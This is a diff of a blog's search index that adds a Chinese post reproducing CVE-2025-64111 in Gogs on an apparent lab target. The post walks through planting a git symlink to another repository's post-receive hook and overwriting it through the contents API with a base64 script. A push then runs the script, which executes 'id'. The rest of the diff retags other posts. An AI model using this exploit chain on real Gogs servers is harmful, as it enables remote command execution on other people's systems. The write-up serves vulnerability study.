@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>CVE学习(持续更新)</title>
+      <link href="/2026/04/23/CVE/"/>
+      <url>/2026/04/23/CVE/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CVE-2025-64111"><a href="#CVE-2025-64111" class="headerlink" title="CVE-2025-64111"></a>CVE-2025-64111</h1><p><em>靶标介绍：</em></p><p>Gogs 是一款使用 Go 语言开发的开源自托管 Git 服务平台，主打轻量化与易部署，广泛应用于个人及小型团队的私有代码托管场景。 攻击者可通过特定 API 接口绕过安全检查，构造符号链接指向 .git&#x2F;config 配置文件，并对其内容进行修改。通过在配置文件中注入恶意 sshCommand 参数，攻击者可在系统执行 Git 相关操作时触发远程命令执行。（账号密码：gogs_admin&#x2F;admin123）</p><p>影响版本&lt;&#x3D;0.13.3，CVSS4.0评分9.3</p><p>访问<a href="http://39.106.48.123:32916/admin%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%EF%BC%9A">http://39.106.48.123:32916/admin可以查看版本信息：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0.13.3</span><br><span class="line">Git 版本</span><br><span class="line">2.47.2</span><br><span class="line">Go 版本</span><br><span class="line">go1.24.4</span><br><span class="line">编译时间</span><br><span class="line">2025-06-09 12:44:37 UTC</span><br><span class="line">构建提交</span><br><span class="line">5084b4a9b77a506f5e287e82e945e1c6882b827a </span><br></pre></td></tr></table></figure><p>访问平台，账号登陆</p><p>进入后，生成API token：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2565049be39a50a662d2391b0281f92713924489</span><br></pre></td></tr></table></figure><p>创建两个仓库exp和hook，本地文件夹初始化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place</span><br><span class="line">$ <span class="built_in">cd</span> exp</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp</span><br><span class="line">$ git init</span><br><span class="line">Initialized empty Git repository <span class="keyword">in</span> C:/Wolf/Work-place/exp/.git/</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ <span class="built_in">cd</span> ../hook</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook</span><br><span class="line">$ git init</span><br><span class="line">Initialized empty Git repository <span class="keyword">in</span> C:/Wolf/Work-place/hook/.git/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每个文件夹内创建一个README，hook文件夹内还要有symlink_target.txt，内容写&#x2F;data&#x2F;git&#x2F;gogs-repositories&#x2F;gogs_admin&#x2F;&lt;exp仓库名&gt;.git&#x2F;hooks&#x2F;post-receive，也就是&#x2F;data&#x2F;git&#x2F;gogs-repositories&#x2F;gogs_admin&#x2F;exp.git&#x2F;hooks&#x2F;post-receive，还有一个空的h文件</p><p>exp仓库push一次：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ cd ../exp</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ ls</span><br><span class="line">README.md</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git -c user.name=attacker -c user.email=a@a commit -m &#x27;one-test&#x27;</span><br><span class="line">[master (root-commit) 05d8e9b] one-test</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 README.md</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git remote add origin http://gogs_admin:admin123@39.106.48.123:32916/gogs_admin/exp.git</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git -c credential.helper= push -u origin master</span><br><span class="line">Enumerating objects: 3, done.</span><br><span class="line">Counting objects: 100% (3/3), done.</span><br><span class="line">Writing objects: 100% (3/3), 195 bytes | 195.00 KiB/s, done.</span><br><span class="line">Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)</span><br><span class="line">To http://39.106.48.123:32916/gogs_admin/exp.git</span><br><span class="line"> * [new branch]      master -&gt; master</span><br><span class="line">branch &#x27;master&#x27; set up to track &#x27;origin/master&#x27;.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>git -c user.name&#x3D;attacker -c user.email&#x3D;a@a commit -m ‘one-test’设置用户名以及邮箱为假的即可，职业素养</p><p>-c credential.helper&#x3D;，避免 Git Credential Manager 干扰</p><p>hook仓库要进行一点操作，文件按前面说的操作好就行，目的是做一个 symlink 指向 exp 的 post-receive，目标路径通常是&#x2F;data&#x2F;git&#x2F;gogs-repositories&#x2F;gogs_admin&#x2F;&lt;exp仓库名&gt;.git&#x2F;hooks&#x2F;post-receive</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ <span class="built_in">cd</span> ../hook</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ git init</span><br><span class="line">Reinitialized existing Git repository <span class="keyword">in</span> C:/Wolf/Work-place/hook/.git/</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ git -c user.name=attacker -c user.email=a@a commit -m <span class="string">&#x27;one-test&#x27;</span></span><br><span class="line">[master (root-commit) 5d11bc6] one-test</span><br><span class="line"> 3 files changed, 2 insertions(+)</span><br><span class="line"> create mode 100644 README.md</span><br><span class="line"> create mode 100644 h</span><br><span class="line"> create mode 100644 symlink_target.txt</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ blob=$(git hash-object -w symlink_target.txt)</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$blob</span></span><br><span class="line">38321919f0eb8d72e5c7cb5773f9aa31c8799066</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ git update-index --add --cacheinfo 120000 <span class="variable">$blob</span> h</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ git ls-files --stage</span><br><span class="line">100644 56a6051ca2b02b04ef92d5150c9ef600403cb1de 0       README.md</span><br><span class="line">120000 38321919f0eb8d72e5c7cb5773f9aa31c8799066 0       h</span><br><span class="line">100644 38321919f0eb8d72e5c7cb5773f9aa31c8799066 0       symlink_target.txt</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ git -c user.name=attacker -c user.email=a@a commit -m <span class="string">&#x27;add hook symlink&#x27;</span></span><br><span class="line">[master fef911f] add hook symlink</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> mode change 100644 =&gt; 120000 h</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ git remote add origin http://gogs_admin:admin123@39.106.48.123:32916/gogs_admin/hook.git</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/hook (master)</span><br><span class="line">$ git -c credential.helper= push -u origin master</span><br><span class="line">Enumerating objects: 7, <span class="keyword">done</span>.</span><br><span class="line">Counting objects: 100% (7/7), <span class="keyword">done</span>.</span><br><span class="line">Delta compression using up to 8 threads</span><br><span class="line">Compressing objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">Writing objects: 100% (7/7), 577 bytes | 577.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Total 7 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)</span><br><span class="line">To http://39.106.48.123:32916/gogs_admin/hook.git</span><br><span class="line"> * [new branch]      master -&gt; master</span><br><span class="line">branch <span class="string">&#x27;master&#x27;</span> <span class="built_in">set</span> up to track <span class="string">&#x27;origin/master&#x27;</span>.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blob=$(git hash-object -w symlink_target.txt)</span><br><span class="line">git update-index --add --cacheinfo 120000 <span class="variable">$blob</span> h</span><br></pre></td></tr></table></figure><p>添加一个名为 h 的文件，类型是<strong>符号链接</strong>，而它指向的内容就是 $blob 里的那个路径</p><p>&#x2F;data&#x2F;git&#x2F;gogs-repositories&#x2F;gogs_admin&#x2F;exp.git&#x2F;hooks&#x2F;post-receive</p><p>这里要根据仓库名进行修改，可以验证传上去的是symlink类型</p><p><img src="/img/CVE-2025-64111/1.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/repos/gogs_admin/hook/contents/h</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>token 2565049be39a50a662d2391b0281f92713924489</span><br></pre></td></tr></table></figure><p>开始准备脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">id</span> 2&gt;/dev/null</span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>base64编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IyEvYmluL3NoCmlkIDI+L2Rldi9udWxsCmV4aXQgMA==</span><br></pre></td></tr></table></figure><p>用漏洞接口覆写 symlink 指向的 hook 文件，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/api/v1/repos/gogs_admin/hook/contents/h</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>token 2565049be39a50a662d2391b0281f92713924489</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-nix">&#123;</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;branch&quot;</span>:<span class="string">&quot;master&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;message&quot;</span>:<span class="string">&quot;overwrite hook&quot;</span>,</span></span><br><span class="line"><span class="language-nix">  <span class="string">&quot;content&quot;</span>:<span class="string">&quot;IyEvYmluL3NoCmlkIDI+L2Rldi9udWxsCmV4aXQgMA==&quot;</span></span></span><br><span class="line"><span class="language-nix">&#125;</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">HTTP<span class="symbol">/1.1</span> <span class="number">201</span> Created</span></span><br></pre></td></tr></table></figure><p>返回201已经创建即可</p><p>最后回到 exp 仓库，再 push 一次触发 hook随便修改一下README，然后push即可触发代码，并返回结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git -c user.name=attacker -c user.email=a@a commit -m <span class="string">&#x27;exp&#x27;</span></span><br><span class="line">[master a6eb67e] exp</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git -c credential.helper= push -u origin master</span><br><span class="line">Enumerating objects: 5, <span class="keyword">done</span>.</span><br><span class="line">Counting objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">Writing objects: 100% (3/3), 223 bytes | 223.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)</span><br><span class="line">remote: uid=1000(git) gid=102(git) <span class="built_in">groups</span>=102(git),102(git)</span><br><span class="line">To http://39.106.48.123:32916/gogs_admin/exp.git</span><br><span class="line">   05d8e9b..a6eb67e  master -&gt; master</span><br><span class="line">branch <span class="string">&#x27;master&#x27;</span> <span class="built_in">set</span> up to track <span class="string">&#x27;origin/master&#x27;</span>.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到返回了id命令的结果</p><h1 id="CVE-2023-1773"><a href="#CVE-2023-1773" class="headerlink" title="CVE-2023-1773"></a>CVE-2023-1773</h1><p><em>靶标介绍：</em></p><p>信呼OA是一款免费开源的办公OA系统，包括APP，pc上客户端，REIM即时通信，服务端等。信呼OA在2.3.3版本之前存在代码注入漏洞。该漏洞影响到组件配置文件处理程序的webmainConfig.php文件的代码。篡改导致代码注入。</p><p>信呼OA &lt;&#x3D;2.3.3 代码注入</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CVE </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CVE学习 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>蚁景网安-双层内网渗透虚拟仿真实战</title>
       <link href="/2026/04/23/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/"/>
       <url>/2026/04/23/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/</url>
@@ -15,10 +42,16 @@
           
           <category> Web安全 </category>
           
-          <category> 渗透 </category>
-          
       </categories>
       
+      
+        <tags>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 隧道搭建 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -36,10 +69,18 @@
           
           <category> Web安全 </category>
           
-          <category> 渗透 </category>
-          
       </categories>
       
+      
+        <tags>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 内网渗透 </tag>
+            
+            <tag> 隧道搭建 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -55,10 +96,18 @@
       
       <categories>
           
-          <category> PHP </category>
+          <category> Web安全 </category>
           
       </categories>
       
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 自增原理 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -75,8 +124,6 @@
       <categories>
           
           <category> Web安全 </category>
-          
-          <category> JavaScript </category>
           
       </categories>
       
@@ -134,10 +181,16 @@
       
       <categories>
           
-          <category> 脚本收集 </category>
+          <category> tools </category>
           
       </categories>
       
+      
+        <tags>
+            
+            <tag> 脚本收集 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -153,10 +206,20 @@
       
       <categories>
           
-          <category> CTF刷题 </category>
+          <category> CTF </category>
           
       </categories>
       
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PHP </tag>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -172,10 +235,18 @@
       
       <categories>
           
-          <category> CTF刷题 </category>
+          <category> CTF </category>
           
       </categories>
       
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> CTF刷题 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -191,10 +262,18 @@
       
       <categories>
           
-          <category> CTF工具 </category>
+          <category> tools </category>
           
       </categories>
       
+      
+        <tags>
+            
+            <tag> CTF工具使用 </tag>
+            
+            <tag> MD5碰撞 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -211,8 +290,6 @@
       <categories>
           
           <category> Web安全 </category>
-          
-          <category> PHP </category>
           
       </categories>
       
@@ -239,6 +316,12 @@
         <content type="html"><![CDATA[<h1 id="为什么突然要重构"><a href="#为什么突然要重构" class="headerlink" title="为什么突然要重构"></a>为什么突然要重构</h1><p>因为原本的博客是大二那会做的，修修补补的做的乱七八糟（其实还有好多别的事情也是），痛定思痛要重新做的更规范，所以重新搭建了一下，换了一个主题，虽然这个主题是移植版本，但是作为一个笔记博客来说完全够了</p><p><img src="/assets/img/hello-world/%E6%81%8D%E7%84%B6%E5%B0%8F%E6%82%9F.webp"></p>]]></content>
       
       
+      <categories>
+          
+          <category> 杂项 </category>
+          
+      </categories>
+      
       
     </entry>
     
@@ -256,10 +339,16 @@
           
           <category> Web安全 </category>
           
-          <category> 代码审计 </category>
-          
       </categories>
       
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
       
     </entry>
     
